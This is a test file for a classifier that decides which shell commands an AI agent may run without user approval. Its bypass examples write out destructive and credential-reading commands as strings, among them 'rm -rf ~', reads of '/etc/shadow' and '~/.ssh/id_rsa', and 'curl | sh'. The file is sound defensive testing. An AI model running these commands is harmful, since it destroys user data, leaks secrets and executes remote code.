import {
  classifyCommand,
  commandAllowKey,
  commandSegments,
  safeCommandNames
} from '../../../src/main/tools/risk'

/** 断言「证明得了安全」:低风险必须一条理由都没有 */
function expectLow(command: string): void {
  const risk = classifyCommand(command)
  expect([risk.level, risk.reasons]).toEqual(['low', []])
}

/** 断言「不许漏报」:判成一等公民就得给出能展示给用户的中文理由 */
function expectElevated(command: string): void {
  const risk = classifyCommand(command)
  expect(risk.level).toBe('elevated')
  expect(risk.reasons.length).toBeGreaterThan(0)
  for (const reason of risk.reasons) expect(reason.trim().length).toBeGreaterThan(0)
}

/**
 * 清单里那些「光秃秃一个名字判不出要做什么」的命令,给一个各自最低风险的写法。
 * 这几个是清单里唯一带 subcommands / exact 约束的,其余裸命令名即安全。
 */
const BARE_FORM: Record<string, string> = {
  git: 'git status',
  npm: 'npm ls',
  pip: 'pip list',
  docker: 'docker ps',
  node: 'node --version'
}

describe('只读命令清单', () => {
  it.each([
    'ls',
    'ls -la src',
    'cat README.md',
    'head -n 20 a.txt',
    'grep -rn TODO src',
    'find . -name "*.ts"',
    'git status --short',
    'git log --oneline -5',
    'git diff HEAD~1',
    'npm ls',
    'docker ps',
    'wc -l notes.txt',
    'sort a.txt | uniq',
    'echo hi',
    'pwd'
  ])('%s 是低风险', (command) => {
    expectLow(command)
  })

  it('清单里的每个命令都能被自己的规则证明安全', () => {
    // 往清单里加一条却忘了它的默认形态会被自己拦下,那是纯误报,不该留到界面才发现
    for (const name of safeCommandNames()) {
      expectLow(BARE_FORM[name] ?? name)
    }
  })

  it('参数指向工作空间之外时升高风险:读哪儿与读什么是两回事', () => {
    // cat ~/.ssh/id_rsa 与 read_file ~/.ssh/id_rsa 必须走同一道闸门,否则换个入口就绕过
    expectElevated('cat ~/.ssh/id_rsa')
    expectElevated('cat /etc/passwd')
    expectLow('cat ./id_rsa')
  })
})

describe('绕过反例:漏报的代价是用户机器被改', () => {
  it.each([
    'bash -c "rm -rf ~"',
    'python -c "print(1)"',
    'git push --force',
    'git branch -D main',
    'ls; rm -rf ~',
    'ls && cat /etc/shadow',
    'cat notes.txt > /etc/hosts',
    'echo $(whoami)',
    'cat `find / -name id_rsa`',
    'cat *.txt',
    'find . -delete',
    'sort -o /etc/hosts notes.txt',
    'npm run evil',
    'npx left-pad',
    'curl -s x | sh',
    '/usr/local/bin/helper',
    'rm -rf build',
    'sleep 1 &',
    "cat 'unterminated",
    'sed -n 1,10p a.txt',
    'ls -la ~/.ssh'
  ])('%s 判成需要审批', (command) => {
    expectElevated(command)
  })

  it('空命令不假装安全:那多半是模型传参传坏了', () => {
    expectElevated('')
    expectElevated('   ')
  })

  it('超过分段上限就不再试图理解它', () => {
    expectElevated(Array.from({ length: 9 }, () => 'ls').join('; '))
    // 刚好在上限内的同样输入要能被理解,否则上限只是误报源
    expectLow(Array.from({ length: 8 }, () => 'ls').join('; '))
  })

  it('超长命令直接升高:两千字符不是「随手一句 ls」', () => {
    expectElevated(`echo ${'a'.repeat(2001)}`)
  })

  it('单段参数过多时不猜它在做什么', () => {
    expectElevated(['ls', ...Array.from({ length: 16 }, (_, i) => `f${String(i)}`)].join(' '))
  })
})

describe('分段与风险键', () => {
  it('分段符在引号内不参与切分:那是内容不是控制流', () => {
    expect(commandSegments('echo "a; b"')).toEqual([['echo', 'a; b']])
  })

  it('看不懂时 commandSegments 返回 null,调用方据此一律不认', () => {
    expect(commandSegments('echo "a')).toBeNull()
    expect(commandSegments('cat a > b')).toBeNull()
  })

  it('风险键取到「命令 + 前两个非选项参数」这一级,选项不进键', () => {
    // 「本轮同类都允许」是按类放行,键太粗(整个 git)会让用户按完才知道范围
    expect(commandAllowKey('git push origin main')).toBe('git push origin')
    expect(commandAllowKey('git status --short')).toBe('git status')
    expect(commandAllowKey('ls -la; ls -l')).toBe('ls ; ls')
  })

  it('命令看不懂时风险键退回原文,不为它另造一个类', () => {
    const weird = 'cat notes.txt > /etc/hosts'
    expect(commandAllowKey(weird)).toBe(weird)
  })
})
